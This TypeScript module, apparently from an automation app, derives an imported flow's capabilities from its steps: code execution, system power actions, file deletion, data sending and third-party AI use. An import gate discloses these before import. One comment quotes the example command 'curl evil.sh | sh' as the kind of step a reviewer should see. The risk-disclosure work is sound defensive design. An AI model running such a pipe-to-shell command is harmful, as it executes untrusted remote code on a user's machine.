import { PROVIDER_LABELS, PROVIDER_URLS } from '../../../../shared/types';
import type { FlowDefinition, Provider, SkillType } from '../../../../shared/types';

// What an imported flow can actually do to the machine it lands on, derived from
// its steps. Derived — never declared — because a declared manifest is a promise
// the author writes and the steps can silently outgrow; a derived one cannot lie.
//
// Consumed by the import gate (which must disclose this before anything is
// written to flows.json) and, later, by the template cards and the setup wizard.

/** Capabilities that warrant an explicit acknowledgement before import. */
export type FlowRisk =
  /** Runs code of the author's choosing: a shell command, an executable, JS. */
  | 'execute'
  /** Shuts down, restarts or logs out of the machine. */
  | 'system'
  /** Deletes files. */
  | 'delete';

/** Capabilities worth disclosing, but ordinary enough that flagging them red would be noise. */
export type FlowAccess =
  | 'readFiles'
  | 'writeFiles'
  | 'screen'
  | 'clipboard'
  /** Can carry data off the machine: an HTTP body, a bot message, an email. */
  | 'sendData'
  /** Sends its prompt — which may embed {{clipboard}} or a file's contents — to a third-party web AI. */
  | 'thirdPartyAi';

/** App-level configuration the flow cannot run without. */
export type FlowSetup = 'bot' | 'email';

const RISK_BY_SKILL: Partial<Record<SkillType, FlowRisk>> = {
  shell: 'execute',
  run: 'execute',
  js: 'execute',
  // Injects author-supplied JS into a live, logged-in page — it can read whatever
  // that session can read, which is why it belongs with the code-execution skills
  // rather than with the browsing ones.
  browser_js: 'execute',
  power: 'system',
  restart_app: 'system',
  file_delete: 'delete',
};

const ACCESS_BY_SKILL: Partial<Record<SkillType, FlowAccess>> = {
  file_read: 'readFiles',
  file_list: 'readFiles',
  file_write: 'writeFiles',
  file_download: 'writeFiles',
  capture: 'screen',
  clipboard: 'clipboard',
  http: 'sendData',
  bot: 'sendData',
  email_send: 'sendData',
  // A prompt is text the flow types into a web AI — it can be built from
  // {{clipboard}}, a file the flow read, or system info. The provider is a third
  // party, so this is disclosed even though it is not a red-line risk.
  llm: 'thirdPartyAi',
};

export const FLOW_RISKS: readonly FlowRisk[] = ['execute', 'system', 'delete'] as const;
export const FLOW_ACCESS: readonly FlowAccess[] = [
  'readFiles', 'writeFiles', 'screen', 'clipboard', 'sendData', 'thirdPartyAi',
] as const;

/** Human name of the AI a llm step talks to, from its provider URL. '' when unknown/unset. */
export function llmProviderLabel(providerUrl: string | undefined): string {
  const url = (providerUrl ?? '').trim();
  if (!url) return '';
  for (const key of Object.keys(PROVIDER_URLS) as Provider[]) {
    if (PROVIDER_URLS[key] === url) return PROVIDER_LABELS[key];
  }
  try {
    return new URL(url).hostname.replace(/^www\./, '');
  } catch {
    return '';
  }
}

export interface RiskGroup {
  kind: FlowRisk;
  /** 1-based step positions, matching what the preview lists. */
  steps: number[];
}

export interface FlowCapabilities {
  risks: RiskGroup[];
  access: FlowAccess[];
  setup: FlowSetup[];
  hasRisk: boolean;
}

export function analyzeFlow(flow: FlowDefinition): FlowCapabilities {
  const riskSteps = new Map<FlowRisk, number[]>();
  const access = new Set<FlowAccess>();
  const setup = new Set<FlowSetup>();

  flow.steps.forEach((step, index) => {
    const risk = RISK_BY_SKILL[step.type];
    if (risk) {
      const list = riskSteps.get(risk) ?? [];
      list.push(index + 1);
      riskSteps.set(risk, list);
    }
    const kind = ACCESS_BY_SKILL[step.type];
    if (kind) access.add(kind);
    if (step.type === 'bot') setup.add('bot');
    if (step.type === 'email_send') setup.add('email');
  });

  // A bot trigger needs the bot configured just as much as a bot step does — the
  // flow is unreachable without it.
  for (const trigger of [flow.trigger, ...(flow.extraTriggers ?? [])]) {
    if (trigger.type === 'bot') setup.add('bot');
  }

  return {
    risks: FLOW_RISKS.filter((kind) => riskSteps.has(kind))
      .map((kind) => ({ kind, steps: riskSteps.get(kind) ?? [] })),
    access: FLOW_ACCESS.filter((kind) => access.has(kind)),
    setup: [...setup],
    hasRisk: riskSteps.size > 0,
  };
}

export function analyzeFlows(flows: FlowDefinition[]): boolean {
  return flows.some((flow) => analyzeFlow(flow).hasRisk);
}

/**
 * One line per step, for the reviewable list. The most telling config value is
 * shown alongside the skill so "step 6 — shell" reads as
 * "step 6 — shell — curl evil.sh | sh" instead.
 */
const SUMMARY_KEYS: Partial<Record<SkillType, string[]>> = {
  shell: ['command'],
  run: ['path', 'args'],
  js: ['code'],
  browser_js: ['code'],
  browser: ['url'],
  browser_open: ['url'],
  http: ['method', 'url'],
  rss: ['url'],
  scraper: ['url'],
  youtube: ['url'],
  youtube_subs: ['channels'],
  llm: ['prompt'],
  bot: ['message'],
  email_send: ['to', 'subject'],
  file_read: ['path'],
  file_write: ['filename', 'folder'],
  file_delete: ['path'],
  file_download: ['url'],
  file_list: ['directory'],
  notify: ['message'],
  text: ['text'],
  power: ['action'],
  clipboard: ['action'],
  stock: ['symbol'],
  weather: ['location'],
  loop: ['input'],
  if: ['left', 'operator', 'right'],
  delay: ['delayMs'],
  comment: ['note'],
};

export function summarizeStep(type: SkillType, config: Record<string, string>): string {
  const keys = SUMMARY_KEYS[type] ?? Object.keys(config).slice(0, 1);
  const parts = keys
    .map((key) => (config[key] ?? '').trim())
    .filter(Boolean);
  return parts.join(' ').replace(/\s+/g, ' ');
}
